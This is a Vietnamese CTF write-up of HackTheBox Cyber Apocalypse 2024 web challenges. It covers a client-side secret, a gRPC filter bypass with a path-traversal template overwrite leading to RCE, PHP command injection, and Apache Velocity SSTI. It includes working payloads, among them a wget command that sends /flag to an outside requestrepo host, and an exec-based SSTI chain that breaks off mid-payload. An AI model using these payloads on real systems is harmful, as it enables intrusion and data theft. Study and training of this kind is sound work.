---
title: "Cyber Apocalypse 2024 - Solved 's challenges in time"
excerpt: "March 09, 2024 07:00 AM ICT to March 13, 2024 07:00 AM ICT"

header:
show_date: true
header:
  teaser: "../assets/images/images-icon/htb-cyber.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/htb-cyber.jpg" alt="">
</p>

# Cyber Apocalypse 2024: Hacker Royale with KCSC


## Flag Command

- ![image](https://hackmd.io/_uploads/Sk2v1zlRT.png)

- Đây là một bài client khá là dễ:
- ![image](https://hackmd.io/_uploads/r1JpgflAp.png)

- Để ý phần hàm

```
const fetchOptions = () => {
    fetch('/api/options')
        .then((data) => data.json())
        .then((res) => {
            availableOptions = res.allPossibleCommands;

        })
        .catch(() => {
            availableOptions = undefined;
        })
}

```

- Hàm gọi method get tới endpoint /api/options và trả về json, hãy xem thử
- ![image](https://hackmd.io/_uploads/Hy3mfMxR6.png)
- Như ta thấy thì có `secret = Blip-blop, in a pickle with a hiccup! Shmiggity-shmack`

```
async function CheckMessage() {
    fetchingResponse = true;
    currentCommand = commandHistory[commandHistory.length - 1];

    if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand)) {
        await fetch('/api/monitor', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 'command': currentCommand })
        })
            .then((res) => res.json())
            .then(async (data) => {
                console.log(data)
                await displayLineInTerminal({ text: data.message });

                if(data.message.includes('Game over')) {
                    playerLost();
                    fetchingResponse = false;
                    return;
                }

                if(data.message.includes('HTB{')) {
                    playerWon();
                    fetchingResponse = false;

                    return;
                }

                if (currentCommand == 'HEAD NORTH') {
                    currentStep = '2';
                }
                else if (currentCommand == 'FOLLOW A MYSTERIOUS PATH') {
                    currentStep = '3'
                }
                else if (currentCommand == 'SET UP CAMP') {
                    currentStep = '4'
                }

                let lineBreak = document.createElement("br");


                beforeDiv.parentNode.insertBefore(lineBreak, beforeDiv);
                displayLineInTerminal({ text: '<span class="command">You have 4 options!</span>' })
                displayLinesInTerminal({ lines: availableOptions[currentStep] })
                fetchingResponse = false;
            });


    }
    else {
        displayLineInTerminal({ text: "You do realise its not a park where you can just play around and move around pick from options how are hard it is for you????" });
        fetchingResponse = false;
    }
}

```

- Hàm này thực hiện POST với data là json `command` nếu mà res chứa ``HTB{`` thì win.

- Tất nhiên là post secret lên rồi và nhận cờ
- ![image](https://hackmd.io/_uploads/B1aQQzgAT.png)

- Flag : `HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}`

## Testimonial


- Một chall với golang chạy grpc để làm waf:

![image](https://hackmd.io/_uploads/S1DrbhiLR.png)

- Ta có thế thấy flow chính của trang nằm ở main.go:

```

package main

import (
	"embed"
	"htbchal/handler"
	"htbchal/pb"
	"log"
	"net"
	"net/http"

	"github.com/go-chi/chi/v5"
	"google.golang.org/grpc"
)

//go:embed public
var FS embed.FS

func main() {
	router := chi.NewMux()

	router.Handle("/*", http.StripPrefix("/", http.FileServer(http.FS(FS))))
	router.Get("/", handler.MakeHandler(handler.HandleHomeIndex))
	go startGRPC()
	log.Fatal(http.ListenAndServe(":1337", router))
}

type server struct {
	pb.RickyServiceServer
}

func startGRPC() error {
	lis, err := net.Listen("tcp", ":50045")
	if err != nil {
		log.Fatal(err)
	}
	s := grpc.NewServer()

	pb.RegisterRickyServiceServer(s, &server{})
	if err := s.Serve(lis); err != nil {
		log.Fatal(err)
	}
	return nil
}

```

- ở đây chúng ta có thể thấy có một route chúng đó là `router.Get("/", handler.MakeHandler(handler.HandleHomeIndex))` và để ý thêm là server đang chạy ở cổng 1337 và start thêm một cổng 50045 với giao thức tcp để lắng nghe các sự kiện.

- Dưới đây là phần logic của HandlerHomeIndex:

```
func HandleHomeIndex(w http.ResponseWriter, r *http.Request) error {
	customer := r.URL.Query().Get("customer")
	testimonial := r.URL.Query().Get("testimonial")
	if customer != "" && testimonial != "" {
		c, err := client.GetClient()
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)

		}

		if err := c.SendTestimonial(customer, testimonial); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)

		}
	}
	return home.Index().Render(r.Context(), w)
}

```

- Nhận 2 query đó là `customer` và `testimonial` nếu mà 1 trong 2 giá trị không tồn tại thì trả tra error.
- Sau đó khởi tạo connect đến localhost port tcp `c, err := client.GetClient()`:

```
func GetClient() (*Client, error) {
	mutex.Lock()
	defer mutex.Unlock()

	if grpcClient == nil {
		conn, err := grpc.Dial(fmt.Sprintf("127.0.0.1%s", ":50045"), grpc.WithInsecure())
		if err != nil {
			return nil, err
		}

		grpcClient = &Client{pb.NewRickyServiceClient(conn)}
	}

	return grpcClient, nil
}
```

- Tiếp tục gửi 2 query đến tcp server `c.SendTestimonial(customer, testimonial)`:

```
func (c *Client) SendTestimonial(customer, testimonial string) error {
	ctx := context.Background()
	// Filter bad characters.
	for _, char := range []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", "."} {
		customer = strings.ReplaceAll(customer, char, "")
	}

	_, err := c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})
	return err
}
```


- ở đây nó sẽ lặp qua mảng các string như trên để filter các lỗi xss hoặc ssti và các lỗi có nguy cơ xảy ra trong cú pháp của golang -> replace toàn bộ những kí tự gặp phải -> gọi phương thức `c.SubmitTestimonial(ctx, &pb.TestimonialSubmission{Customer: customer, Testimonial: testimonial})` để gửi chúng.

- Cuối cùng sẽ hiển thị `return home.Index().Render(r.Context(), w)` chính là template `index.templ` để hiển thị các bản note đã ghi:


```

package home

import (
	"htbchal/view/layout"
	"io/fs"	
	"fmt"
	"os"
)

templ Index() {
	@layout.App(true) {
<nav class="navbar navbar-expand-lg navbar-dark bg-black">
  <div class="container-fluid">
    <a class="navbar-brand" href="/">The Fray</a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav"
            aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav ml-auto">
            <li class="nav-item active">
                <a class="nav-link" href="/">Home</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="javascript:void();">Factions</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="javascript:void();">Trials</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="javascript:void();">Contact</a>
            </li>
        </ul>
    </div>
  </div>
</nav>

<div class="container">
  <section class="jumbotron text-center">
      <div class="container mt-5">
          <h1 class="display-4">Welcome to The Fray</h1>
          <p class="lead">Assemble your faction and prove you're the last one standing!</p>
          <a href="javascript:void();" class="btn btn-primary btn-lg">Get Started</a>
      </div>
  </section>

  <section class="container mt-5">
      <h2 class="text-center mb-4">What Others Say</h2>
      <div class="row">
          @Testimonials()
      </div>
  </section>


  <div class="row mt-5 mb-5">
    <div class="col-md">
      <h2 class="text-center mb-4">Submit Your Testimonial</h2>
      <form method="get" action="/">
        <div class="form-group">
          <label class="mt-2" for="testimonialText">Your Testimonial</label>
          <textarea class="form-control mt-2" id="testimonialText" rows="3" name="testimonial"></textarea>
        </div>
        <div class="form-group">
          <label class="mt-2" for="testifierName">Your Name</label>
          <input type="text" class="form-control mt-2" id="testifierName" name="customer"/>
        </div>
        <button type="submit" class="btn btn-primary mt-4">Submit Testimonial</button>
      </form>
    </div>
  </div>
</div>

<footer class="bg-black text-white text-center py-3">
    <p>&copy; 2024 The Fray. All Rights Reserved.</p>
</footer>
	}
}

func GetTestimonials() []string {
	fsys := os.DirFS("public/testimonials")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

templ Testimonials() {
  for _, item := range GetTestimonials() {
    <div class="col-md-4">
        <div class="card mb-4">
            <div class="card-body">
                <p class="card-text">"{item}"</p>
                <p class="text-muted">- Anonymous Testifier</p>
            </div>
        </div>
    </div>
  }
}
```

- Ta có thể thấy ở đây thì trang sẽ hiển thị các bản note theo định dạng string hết nên khó có thể xss hoặc ssti ở đây:

```
func GetTestimonials() []string {
	fsys := os.DirFS("public/testimonials")	
	files, err := fs.ReadDir(fsys, ".")		
	if err != nil {
		return []string{fmt.Sprintf("Error reading testimonials: %v", err)}
	}
	var res []string
	for _, file := range files {
		fileContent, _ := fs.ReadFile(fsys, file.Name())
		res = append(res, string(fileContent))		
	}
	return res
}

```

- Cùng để ý vị trí của flag:


```

FROM golang:1.22-alpine3.18

WORKDIR /challenge/

COPY ./challenge/ /challenge/

COPY ./flag.txt /flag.txt

RUN go mod download -x \
 && go install github.com/cosmtrek/air@latest \
 && go install github.com/a-h/templ/cmd/templ@latest

EXPOSE 1337
EXPOSE 50045

COPY --chown=root entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]

```

- Flag nằm tại root nên mục tiêu của ta là RCE được mà khả năng của SSTI với template này hầu như là không được. 
- Như mình đã phần tích thì bạn để ý việc filter do bạn gửi 2 query trên đến server và tcp này có vai trò như một proxy có nghĩa là nó chỉ filter trước khi chúng ta gửi đến nó -> vậy ta có thể kết nối trực tiếp đến tcp luôn không -> câu trả lời là có -> nếu ta gửi trực tiếp đến tcp port lúc này nó không bị filter các kí tự blacklist.

- vậy là ý tưởng để bypass blacklist đã có, vậy thì làm sao để RCE -> ta sẽ đi vào sâu vào luồng mà 2 giá trị ta truyền vào là gì.

- và nó ở đây:


```
func (s *server) SubmitTestimonial(ctx context.Context, req *pb.TestimonialSubmission) (*pb.GenericReply, error) {
	if req.Customer == "" {
		return nil, errors.New("Name is required")
	}
	if req.Testimonial == "" {
		return nil, errors.New("Content is required")
	}

	err := os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial), 0644)
	if err != nil {
		return nil, err
	}

	return &pb.GenericReply{Message: "Testimonial submitted successfully"}, nil
}

```

- ở đây thì sẽ gọi os viết file `os.WriteFile(fmt.Sprintf("public/testimonials/%s", req.Customer), []byte(req.Testimonial)` 
- Vậy do filter '.' nên chúng ta không thể triger path travesal để ghi đè file được.
- ở đây ta có thể dùng postman hoặc grpcurl của golang để gửi request trực tiếp đến grpc.


### RCE
- Đầu tiên ta dùng grpcurl để gửi request -> ghi đề file index.templ
- Sau đó ta triger code để đọc flag 

### Exploit

![image](https://hackmd.io/_uploads/SksPoTiIC.png)


![image](https://hackmd.io/_uploads/ByTui6jIC.png)


```

l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
RickyService
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$

```

- Có thể thấy ở đây đang có một service RickyService như ta thấy đó là chạy tcp với grpc.


- Ta sẽ xem mô tả của service này :

```
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
RickyService
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 describe RickyService
RickyService is a service:
service RickyService {
  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$

```

- Bây giờ ta sẽ gửi request đến nó:

```
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
RickyService
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 describe RickyService
RickyService is a service:
service RickyService {
  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364
RickyService.SubmitTestimonial
Failed to dial target host "94.237.59.63:31364": tls: first record does not look like a TLS handshake
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{"customer": "test", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
{
  "message": "Testimonial submitted successfully"
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$

```

- Nó đã hiển thị ở trong nội dung:

![image](https://hackmd.io/_uploads/HJhcppoI0.png)

- Vậy ta có thể trigger được rồi -> bây giờ thì ghi đè index.templ:


Nội dung:

```
package home

import (
    "os/exec"
    "strings"
)

func hack() []string {
    output, _ := exec.Command("ls", "/").CombinedOutput()
    lines := strings.Fields(string(output))
    return lines
}

templ Index() {
    @template(hack())
}

templ template(items []string) {
    for _, item := range items {
        {item}
    }
}
```

```
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 list
RickyService
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 describe RickyService
RickyService is a service:
service RickyService {
  rpc SubmitTestimonial ( .TestimonialSubmission ) returns ( .GenericReply );
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364
RickyService.SubmitTestimonial
Failed to dial target host "94.237.59.63:31364": tls: first record does not look like a TLS handshake
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{"customer": "test", "testimonial": "test"}' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
{
  "message": "Testimonial submitted successfully"
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"ls\", \"/\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
{
  "message": "Testimonial submitted successfully"
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$
```

![image](https://hackmd.io/_uploads/rkVGJCs80.png)


```
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$ grpcurl -plaintext -d '{"customer": "../../view/home/index.templ", "testimonial": "package home\n\nimport (\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc hack() []string {\n\toutput, _ := exec.Command(\"cat\", \"/flagd9d82e7fe1.txt\").CombinedOutput()\n\tlines := strings.Fields(string(output))\n\treturn lines\n}\n\ntempl Index() {\n\t@template(hack())\n}\n\ntempl template(items []string) {\n\tfor _, item := range items {\n\t\t{item}\n\t}\n}" }' -import-path challenge/pb/ -proto ptypes.proto 94.237.59.63:31364 RickyService.SubmitTestimonial
{
  "message": "Testimonial submitted successfully"
}
l3mnt2010@ASUSEXPERTBOOK:~/tools/Tesmitional$
```


![image](https://hackmd.io/_uploads/HyywyAi8A.png)


flag: `HTB{w34kly_t35t3d_t3mplate5_n0t_s4f3_4t_411}`

## Time KORP

- Đây là một bài command injection đơn giản với mã nguồn php.
- ![image](https://hackmd.io/_uploads/BJz-0bfA6.png)

[RECON
- Đề bài cho ta source code, trước tiên thì xem cơ bản chức năng đã nha :<
- Vào trang ta có thể thấy trang có 2 chức năng chính là hiển thị ngày và hiển thì giờ.
- ![image](https://hackmd.io/_uploads/ByQWJffRT.png)

* Chức năng hiện thị giờ
* ![image](https://hackmd.io/_uploads/rkfGJMG0p.png)

- Sever nhận param format của giờ là `%H:%M:%S` để hiển thị giờ.


* Chức năng hiển thị ngày/tháng/năm
* ![image](https://hackmd.io/_uploads/BkUtJGfAT.png)

- Sever nhận param format là `%Y-%m-%d` để hiển thị.

[DETECT
- Okeee, như ta thấy thì chưa có lỗ hổng gì có thể tìm thấy ở trên cùng viewwww source nào :100: 

- Nhìn một cách tổng quan ta có thể thấy cấu trúc cây thư mục viết theo mô hình MVC khá phổ biến hiện nay :>
- ![image](https://hackmd.io/_uploads/S1PHxfMA6.png)

- Những điểm quan trọng để giải quyết


* views/index.php
```
<h1 class="jumbotron-heading">><span class='text-muted'>It's</span> <?= $time ?><span class='text-muted'>.</span></h1>
```

- Ngoài những phần css và js thì chỉ có điểm này để hiển thị ngày giờ như ở trên ta phân tích.

* Dockerfile

```
FROM debian:buster-slim

# Setup user
RUN useradd www

# Install system packeges
RUN apt-get update && apt-get install -y supervisor nginx lsb-release wget

# Add repos
RUN wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpg
RUN echo "deb https://packages.sury.org/php/ $(lsb_release -sc) main" | tee /etc/apt/sources.list.d/php.list

# Install PHP dependencies
RUN apt update && apt install -y php7.4-fpm

# Configure php-fpm and nginx
COPY config/fpm.conf /etc/php/7.4/fpm/php-fpm.conf
COPY config/supervisord.conf /etc/supervisord.conf
COPY config/nginx.conf /etc/nginx/nginx.conf

# Copy challenge files
COPY challenge /www

# Setup permissions
RUN chown -R www:www /www /var/lib/nginx

# Copy flag
COPY flag /flag

# Expose the port nginx is listening on
EXPOSE 80

# Populate database and start supervisord
CMD /usr/bin/supervisord -c /etc/supervisord.conf
```

- Đoạn này thì chỉ cần chú ý là flag nằm trong `/flag`.


* /index.php

```
<?php
spl_autoload_register(function ($name){
    if (preg_match('/Controller$/', $name))
    {
        $name = "controllers/${name}";
    }
    else if (preg_match('/Model$/', $name))
    {
        $name = "models/${name}";
    }
    include_once "${name}.php";
});

$router = new Router();
$router->new('GET', '/', 'TimeController@index');

$response = $router->match();

die($response);
```

- Mã trên sẽ map controller và model và cả `TimeController@index`.

- Cũng tương tự với Route.php
- Nói khá nhiều nhưng mà phần mấu chốt chỉ có ở đây thoiiiii
- ![image](https://hackmd.io/_uploads/BJrKzfMCT.png)

- Như ta có thể thấy param format nhận được sẽ được nhận để khởi tạo một đối tượng qua class `TimeModel` và map kết quả tra ra ở template 

* models/TimeController.php

```
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```
- Trong class `TimeModel` sẽ khởi tạo với biến format ở trên sẽ tạo 1 command và khi gọi phương thức `getTime()` và exec command

- Hmm, thì đây là mình có thể vận dụng để tấn công commandinjection.


[ATTACK

- Đầu tiên mình thử dùng curl thì sever không có, thử tiếp đến wget với payload:

`';wget+--post-data+"$(cat+/flag)"+-O-+s6thtnzk.requestrepo.com' `

![image](https://hackmd.io/_uploads/SyExUfzAa.png)

- Kết quả:
- ![image](https://hackmd.io/_uploads/BJoWLMM0a.png)


- Đây là nếu bạn muốn blind, còn nếu muốn không blind thì :-1: 
- ![image](https://hackmd.io/_uploads/SJ7V8MzC6.png)


[Flag : `HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}`

## Labyrinth_linguist

![image](https://hackmd.io/_uploads/r1TUwMfCp.png)

- Tiếp tục là một bài white-box nhưng mà với source java mà lâu rùi mình chưa đụng nên mình chưa làm và gần cuối giải thì mới để ý và xem thêm hướng giải quyết của các anh trong clb:


[RECON:

- Đầu tiên thì cũng xem phần "vỏ" của trang này
- ![image](https://hackmd.io/_uploads/Bkx-dfz06.png)

- Thấy cái lá xanh xanh kia là biết java spring boot rùi:<

`Enter text to translate english to voxalith!` nhập text để chuyển đổi qua `voxalith`

![image](https://hackmd.io/_uploads/BJqhdzfCT.png)

- Chức năng cũng khá đơn giản:
- ![image](https://hackmd.io/_uploads/SkjeYzMC6.png)

- Search xem có gì không thì cũng không có gì khác ngoài cái template khá giống bài `j4JA` trong tetCTF,...
- ![image](https://hackmd.io/_uploads/HkWNcMzC6.png)

- ![image](https://hackmd.io/_uploads/BJZeqzfCT.png)

### DETECT

- Sơ qua thì cấu trúc cây thư mục như thế này:
![image](https://hackmd.io/_uploads/Sy5FczzCT.png)

#### /src/main/resources/templates/index.html
![image](https://hackmd.io/_uploads/S1BZoGf06.png)

- Như ta thấy thì khi mà ta submit sẽ post text lên sever để xử lý.


#### Dockerfile
![image](https://hackmd.io/_uploads/ByndiMzAT.png)

- ở chall này thì flag nằm trong `/flag.txt`

* Main.class

```
// Source code is decompiled from a .class file using FernFlower decompiler.
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.StringReader;
import java.io.StringWriter;
import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.runtime.RuntimeServices;
import org.apache.velocity.runtime.RuntimeSingleton;
import org.apache.velocity.runtime.parser.ParseException;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

@Controller
@EnableAutoConfiguration
public class Main {
   public Main() {
   }

   @RequestMapping({"/"})
   @ResponseBody
   String index(@RequestParam(required = false,name = "text") String textString) {
      if (textString == null) {
         textString = "Example text";
      }

      String template = "";

      try {
         template = readFileToString("/app/src/main/resources/templates/index.html", textString);
      } catch (IOException var9) {
         var9.printStackTrace();
      }

      RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
      StringReader reader = new StringReader(template);
      Template t = new Template();
      t.setRuntimeServices(runtimeServices);

      try {
         t.setData(runtimeServices.parse(reader, "home"));
         t.initDocument();
         VelocityContext context = new VelocityContext();
         context.put("name", "World");
         StringWriter writer = new StringWriter();
         t.merge(context, writer);
         template = writer.toString();
      } catch (ParseException var8) {
         var8.printStackTrace();
      }

      return template;
   }

   public static String readFileToString(String filePath, String replacement) throws IOException {
      StringBuilder content = new StringBuilder();
      BufferedReader bufferedReader = null;

      try {
         bufferedReader = new BufferedReader(new FileReader(filePath));

         String line;
         while((line = bufferedReader.readLine()) != null) {
            line = line.replace("TEXT", replacement);
            content.append(line);
            content.append("\n");
         }
      } finally {
         if (bufferedReader != null) {
            try {
               bufferedReader.close();
            } catch (IOException var10) {
               var10.printStackTrace();
            }
         }

      }

      return content.toString();
   }

   public static void main(String[] args) throws Exception {
      System.getProperties().put("server.port", 1337);
      SpringApplication.run(Main.class, args);
   }
}

```

- Decompile sẽ thấy được source kia, thì chall này chỉ có source này chính->

```
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.StringReader;
import java.io.StringWriter;
import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.runtime.RuntimeServices;
import org.apache.velocity.runtime.RuntimeSingleton;
import org.apache.velocity.runtime.parser.ParseException;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.EnableAutoConfiguration;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

```


 - Ta có thể xem version và library của các notification và các hàm sử dụng trong Main.
 - Cần chú ý là sever sử dụng thư viện `apache.velocity` version `1.7`

![image](https://hackmd.io/_uploads/rkuPpGGA6.png)

- Quay lại phần phân tích source như ta đã thấy ở trên thì chall này chỉ có 1 route duy nhất là /.

```

 @RequestMapping({"/"})
   @ResponseBody
   String index(@RequestParam(required = false,name = "text") String textString) {
      if (textString == null) {
         textString = "Example text";
      }

      String template = "";

      try {
         template = readFileToString("/app/src/main/resources/templates/index.html", textString);
      } catch (IOException var9) {
         var9.printStackTrace();
      }

      RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
      StringReader reader = new StringReader(template);
      Template t = new Template();
      t.setRuntimeServices(runtimeServices);

      try {
         t.setData(runtimeServices.parse(reader, "home"));
         t.initDocument();
         VelocityContext context = new VelocityContext();
         context.put("name", "World");
         StringWriter writer = new StringWriter();
         t.merge(context, writer);
         template = writer.toString();
      } catch (ParseException var8) {
         var8.printStackTrace();
      }

      return template;
   }
```


- Đầu tiên nhận giá trị `text` được post lên từ index.html template nếu mà `textString` là null thì gán `textString=Example text` 
- Sau đó khởi tạo String template với chuỗi rỗng.
- Sau đó try catch để gán template bằng nội dung template + hiển thị `textString` 
- Tiếp tục ` RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();`
- Tạo một biến runtimeServices và từ đó ta có thể sử dụng các phương thức và thuộc tính của `RuntimeSingleton.getRuntimeServices();`

- `StringReader reader = new StringReader(template);`: Tạo một đối tượng StringReader từ một chuỗi template. StringReader là một lớp trong Java cho phép đọc từ chuỗi này.

- `Template t = new Template();`: Tạo một thể hiện mới của lớp Template. Đối tượng này sẽ đại diện cho một template, mà sau đó có thể được sử dụng để xử lý và sinh ra dữ liệu đầu ra dựa trên dữ liệu đầu vào được cung cấp.

- `t.setRuntimeServices(runtimeServices);`: Thiết lập RuntimeServices cho đối tượng template t đã tạo. Điều này đảm bảo rằng template có thể sử dụng các dịch vụ và tính năng được cung cấp bởi RuntimeServices, chẳng hạn như các hàm và biến được định nghĩa trong quá trình xử lý template.

- Tiếp nữa là sử dụng try-catch :a: 

```
try {
         t.setData(runtimeServices.parse(reader, "home"));
         t.initDocument();
         VelocityContext context = new VelocityContext();
         context.put("name", "World");
         StringWriter writer = new StringWriter();
         t.merge(context, writer);
         template = writer.toString();
      } catch (ParseException var8) {
         var8.printStackTrace();
      }
```

- t.setData(runtimeServices.parse(reader, "home")): Đọc và phân tích nội dung của reader (đã được tạo từ chuỗi template) bằng cách sử dụng runtimeServices. Kết quả được đặt vào đối tượng t để sử dụng cho việc tạo ra dữ liệu đầu ra.

- t.initDocument(): Khởi tạo tài liệu của template. Điều này chuẩn bị template để merge với dữ liệu và sinh ra dữ liệu đầu ra.

- VelocityContext context = new VelocityContext(): Tạo một đối tượng VelocityContext, một đối tượng lưu trữ các cặp khóa-giá trị được sử dụng trong quá trình merge.

- context.put("name", "World"): Thêm một cặp khóa-giá trị vào VelocityContext. Trong ví dụ này, "name" là khóa và "World" là giá trị tương ứng.

- StringWriter writer = new StringWriter(): Tạo một đối tượng StringWriter để lưu kết quả của việc merge template.

- t.merge(context, writer): Merge template với dữ liệu được cung cấp từ VelocityContext vào StringWriter. Kết quả được lưu trong StringWriter.

- template = writer.toString(): Chuyển nội dung của StringWriter thành một chuỗi và gán vào biến template.


- Để ý đoạn này : ` VelocityContext context = new VelocityContext();` 
![image](https://hackmd.io/_uploads/ry8wzXMAp.png)

- Chưa làm thì cũng đoán chắc đây là SSTI rùi:< 

- Sau khi hỏi mấy anh thì mình tìm được bài nì:
[https://www.linkedin.com/pulse/apache-velocity-server-side-template-injection-marjan-sterjev/ 

- Mình sẽ dựa trên blog này để phân tích.

### Apache Velocity Server-Side Template Injection

- Như search ở trên thì đây là một template để hiển thị nội dung của java từ apache cũng giống như bao thư viện khác


```
import java.io.StringWriter;
import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;

public class VelocityTest {

    public static void main(String[] args) throws Throwable {

        VelocityEngine velocityEngine = new VelocityEngine();
        velocityEngine.init();
        Template t = velocityEngine.getTemplate("template.vm");
        VelocityContext context = new VelocityContext();
        context.put("name", "l3mnt2010");
        StringWriter writer = new StringWriter();
        t.merge(context, writer);
        System.out.println(writer);

    }

}

```

- Ta có thể thấy source khá tương tự ở trên nêu thì khi mình nhập vào thì sẽ hiển thị nội dung name + l3mnt2010:
Đây là [source](https://github.com/l3mnt2010/demoVelocity) : 

- Và cũng giống như những template khác thì `velocity` cũng có thể truy cập được với các cú pháp của nó và ta chú ý đến `#set($message = "l3mnt2010")
`
 - Thì biến $message được gán giá trị là `l3mnt2010`, nếu từ riêng lẻ thì khó có thể thực thi mã với os trên template này nên ta sử dụng kết hợp với các lớp hàm hàm khởi tạo của java luôn:
POC:
 
 ```
 #set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("ls /"))
#set($null=$process.waitFor() )

#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())

